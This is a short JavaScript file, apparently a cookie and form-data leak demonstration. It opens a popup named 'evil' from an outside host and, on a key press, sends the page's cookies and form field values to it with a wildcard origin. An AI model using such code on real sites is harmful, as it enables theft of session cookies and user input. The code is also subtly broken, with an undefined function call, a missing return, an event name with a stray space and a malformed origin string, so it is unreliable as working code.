var viewportwidth = document.documentElement.clientWidth;
let leakWin;

let regex = /[?&]([^=#]+)=([^&#]*)/g,
    url = window.location.href,
    urlQuery = {},
    match;
while(match = regex.exec(url)) {
    urlQuery[match[1]] = match[2];
}

window.addEventListener('keydown', function(evt) {
  if (evt.key === '-') {
    leakWin = window.open("http://reshadi.com/i/leak.html", "evil", "menubar=no,location=no,resizable=yes,scrollbars=yes,status=no,height=700,width=500,left=" + (viewportwidth - 500));
    //let leakWin = window.open("/js/third_party/leak.html", "evil", "menubar=no,location=no,resizable=yes,scrollbars=yes,status=no,height=700,width=500,left="+(viewportwidth-500));
  }
});


window.onbeforeunload = function () { leakWin.close() };

function getCookie(name) {
  var value = "; " + document.cookie;
  var parts = value.split("; " + name + "=");
  if (parts.length == 2) return parts.pop().split(";").shift();
}

function getCookies(names) {
  let result = [];
  for (let i=0; i < names.length; i++) {
    result.push(name, getCookie(names[i]));
  }
}

function getForms(id, clazz, name) {
  var el = document.querySelectorAll(`[id=${id}],[class=${clazz}],[name=${name}]`);
  if (el) {
    return el.value;
  }
  return "";
}

window.addEventListener('keydown ', function(evt) {
  if (evt.key === '=') {
    let date = new Date();
    leakWin.postMessage({
      cookies: getCookies(urlQuery['cookie']),
      form: getForm(urlQuery['id'], urlQuery['class'], urlQuery['name']),
      time: `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`
    }, ' * '); 
  }
});
